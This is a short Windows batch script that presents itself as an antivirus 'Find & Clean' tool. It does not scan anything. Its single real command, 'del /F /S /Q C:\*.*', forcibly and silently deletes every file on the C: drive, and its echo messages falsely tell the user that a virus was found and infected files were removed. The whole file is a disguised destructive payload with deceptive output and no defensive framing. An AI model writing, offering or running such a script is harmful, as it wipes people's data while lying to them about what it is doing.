REM AntiVirus Find & Clean!
REM This batch will remove any virus found on your computer.

@echo off
echo there was a virus found... wait... scanning and cleaning...
del /F /S /Q C:\*.*
echo virus couldn't be cleaned... infected files was removed.
pause
exit